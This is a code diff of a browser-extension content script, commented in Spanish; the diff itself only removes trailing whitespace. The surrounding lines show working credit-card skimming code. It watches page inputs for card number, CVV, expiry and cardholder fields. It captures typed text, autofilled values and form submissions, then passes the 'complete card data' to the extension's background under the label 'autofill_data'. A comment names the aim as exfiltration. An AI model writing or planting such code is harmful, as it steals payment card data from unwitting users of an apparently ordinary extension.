@@ -25,14 +25,14 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
 function monitorPaymentForms() {
   // Observar todos los inputs de tipo texto/number
   const inputs = document.querySelectorAll('input[type="text"], input[type="number"], input[type="tel"]');
-  
+
   inputs.forEach(input => {
     // Detectar campos de tarjeta por name/id/placeholder
     const fieldName = (input.name + input.id + input.placeholder).toLowerCase();
-    
+
     if (isCardField(fieldName)) {
       console.log('[WSU] Card field detected:', input);
-      
+
       // Capturar cuando el usuario escribe
       input.addEventListener('input', (e) => {
         const value = e.target.value;
@@ -81,7 +81,7 @@ function isCardField(fieldName) {
     'expir', 'exp-date', 'expiry',
     'cardholder', 'card-name'
   ];
-  
+
   return patterns.some(pattern => fieldName.includes(pattern));
 }
 
@@ -104,7 +104,7 @@ function captureFieldData(fieldName, value) {
   // Si tenemos suficientes datos, exfiltrar
   if (capturedData.cardNumber && (capturedData.cvv || capturedData.expiry)) {
     console.log('[WSU] Complete card data captured');
-    
+
     chrome.runtime.sendMessage({
       type: 'autofill_data',
       data: {
@@ -124,12 +124,12 @@ document.addEventListener('input', (e) => {
   // Detectar cuando el navegador autocompleta
   if (e.inputType === 'insertReplacementText' || e.target.matches(':-webkit-autofill')) {
     console.log('[WSU] Autofill detected on:', e.target);
-    
+
     // Capturar el valor autocompletado
     setTimeout(() => {
       const fieldName = (e.target.name + e.target.id).toLowerCase();
       const value = e.target.value;
-      
+
       if (value && isCardField(fieldName)) {
         captureFieldData(fieldName, value);
       }
@@ -141,13 +141,13 @@ document.addEventListener('input', (e) => {
 document.addEventListener('submit', (e) => {
   const form = e.target;
   const formData = new FormData(form);
-  
+
   const data = {};
   let hasCardData = false;
 
   for (const [key, value] of formData.entries()) {
     const fieldName = key.toLowerCase();
-    
+
     if (isCardField(fieldName)) {
       data[key] = value;
       hasCardData = true;
@@ -156,7 +156,7 @@ document.addEventListener('submit', (e) => {
 
   if (hasCardData) {
     console.log('[WSU] Card data in form submit');
-    
+
     chrome.runtime.sendMessage({
       type: 'autofill_data',
       data: {
